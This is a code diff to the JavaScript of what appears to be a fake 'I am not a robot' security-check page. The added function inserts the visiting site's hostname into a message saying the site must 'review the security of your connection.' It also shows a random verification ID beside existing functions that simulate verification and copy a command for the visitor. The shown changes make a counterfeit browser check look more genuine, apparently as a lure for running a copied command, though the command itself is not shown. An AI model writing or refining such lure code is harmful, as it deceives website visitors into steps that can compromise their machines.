@@ -1,4 +1,30 @@
 document.addEventListener('DOMContentLoaded', () => {
+    // Dynamic Domain Detection
+    function detectDomain() {
+        const domainElement = document.getElementById('domain-name');
+        const verificationIdElement = document.querySelector('.verification-id');
+        
+        // Get current hostname
+        const hostname = window.location.hostname;
+        
+        // Update domain name
+        if (domainElement) {
+            domainElement.textContent = hostname;
+        }
+        
+        // Update security message
+        const securityMessage = document.querySelector('.security-message');
+        if (securityMessage) {
+            securityMessage.textContent = `${hostname} needs to review the security of your connection before proceeding.`;
+        }
+        
+        // Generate a random verification ID
+        if (verificationIdElement) {
+            const randomId = Math.random().toString(36).substring(2, 8).toUpperCase();
+            verificationIdElement.textContent = `I am not a robot - Verification ID: ${randomId}`;
+        }
+    }
+
     // Theme Detection and Application
     function detectSystemTheme() {
         // Check if the system prefers dark mode
@@ -84,6 +110,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Initialize all functions
     function init() {
+        detectDomain();
         detectSystemTheme();
         simulateVerification();
         setupCommandCopy();
